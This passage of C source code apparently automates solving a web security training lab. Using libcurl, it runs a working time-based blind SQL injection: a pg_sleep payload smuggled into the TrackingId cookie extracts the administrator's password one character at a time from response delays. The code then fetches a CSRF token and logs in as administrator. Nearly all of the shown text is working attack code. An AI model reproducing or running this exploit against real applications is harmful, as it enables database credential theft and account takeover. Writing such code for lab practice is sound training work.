                    snprintf(sqli_payload, 200, "TrackingId=%s'%%3BSELECT+CASE+WHEN+(username='administrator'+AND+ASCII(SUBSTRING(password,%d,1))='%d')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--",tracking_id_cookie, l, asciiValue);
                    curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);

                    if (performCurlRequest(curl, response_buffer) != 0) {
                        free(header);
                        goto quit;
                    }
                    curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &totalTime);
                    if (totalTime > 1.00) {
                        strncpy(password_temp, password, strlen(password));
                        snprintf(password, 50, "%s%c", password_temp, alphabetAndNumbers[i]);
                        break;
                        }
                    i++;
                    }
                l++;
            }


            // login as administrator and solve the lab
            clear_url(url);
            strncat(url, "/login", 6);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");

            if (performCurlRequest(curl, response_buffer) != 0) {
                free(header);
                goto quit;
            }

            extract_csrf_token(response_buffer, csrf_token, 64);

            char post_data[512] = "";
            snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator&password=%s", csrf_token, password);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            sleep(2);
            if (performCurlRequest(curl, response_buffer) != 0) {
                free(header);
                goto quit;
            }
            free(header);
        }
        else {
            printf("[!] Invalid input! (error code: 7)\n");
            goto quit;
        }

    } else {
        printf("[!] curl initialization failed!\n");
        goto quit;
    }

    quit:
    
    clear_url(url);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);

        if (performCurlRequest(curl, response_buffer) != 0)
            return_value = -1;

        if (performCurlRequest(curl, response_buffer) != 0)
            return_value = -1;

        if (strstr(response_buffer, "Congratulations, you solved the lab!") != NULL)
            return_value = 0;

        free(url);
        free(response_buffer);
        if (csrf_token)
            free(csrf_token);
        curl_easy_cleanup(curl);
        curl_global_cleanup();

        return return_value;
}   


int main() {
    char *input_url = (char *)malloc(200);

    show_paas_ascii_art();
    
    printf("\033[38;5;208mLab URL\033[0m: ");
    if (fgets(input_url, 200, stdin) != NULL) {
        if (clear_url(input_url) == 1) {
            if (vulnerabilities(input_url) == 0) {
                printf("[+] Lab successfully solved!\n");
                exit(0);
            } else {
                printf("[-] Something went wrong :(\n");
                exit(-1);
            }

        } else {
            printf("[!] Invalid URL! (error in clear_url func)\n");
            exit(-1);
          }
    } else {
        printf("[!] Invalid URL! (error in fgets func)\n");
        exit(-1);
    }
}